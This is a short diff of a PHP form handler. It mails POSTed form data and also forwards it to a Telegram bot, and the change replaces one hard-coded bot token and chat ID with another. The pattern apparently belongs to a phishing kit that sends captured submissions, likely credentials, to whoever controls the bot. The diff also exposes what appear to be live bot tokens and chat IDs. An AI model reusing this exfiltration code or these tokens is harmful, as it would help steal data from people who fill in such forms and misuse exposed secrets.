@@ -27,8 +27,8 @@ if(!empty($_POST)) {
 		 mail($send, $subject, $message);   
 		 
 			 // Send to Telegram bot
-		 $telegramToken = "5958817138:AAE4qXkISQAbTHyK86ISdrBdtoNdRntGCVM";
-		 $chatId = "948469262";
+		 $telegramToken = "5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g";
+		 $chatId = "5480674751";
 		 $text = urlencode($message);
 		 
 		 $url = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=$text";
